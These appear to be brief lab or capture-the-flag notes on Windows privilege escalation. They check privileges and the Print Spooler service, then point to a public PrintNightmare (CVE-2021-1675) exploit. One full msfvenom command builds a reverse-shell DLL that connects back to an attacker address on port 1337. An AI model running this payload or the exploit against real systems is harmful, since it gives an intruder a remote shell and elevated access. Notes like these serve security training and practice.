running whoami /priv we didnt get much
running Get-Service -Name Spooler
because the server is running printer services we can try printernightmare exploit 
https://github.com/cube0x0/CVE-2021-1675
let's try to make a msfvenom payload
msfvenom  -e x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.17.185 LPORT=1337 -f dll -o lol.dll